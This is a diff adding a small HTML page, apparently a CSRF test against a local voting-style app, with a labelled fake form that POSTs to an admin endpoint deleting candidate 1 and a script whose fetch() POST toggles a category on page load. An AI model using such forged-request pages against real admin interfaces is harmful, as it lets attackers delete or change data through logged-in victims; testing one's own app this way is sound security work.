@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>CSRF Test - Halaman Palsu</h1>
+  <form action="http://pilihankita.local/admin/calon/delete/1" method="POST">
+    <input type="hidden" name="id" value="1">
+    <button type="submit">Hapus Calon (CSRF Attack)</button>
+  </form>
+  <script>
+    // Test via fetch juga
+    fetch('http://pilihankita.local/admin/kategori/toggle/1', { method: 'POST' });
+  </script>
+</body>
+</html>
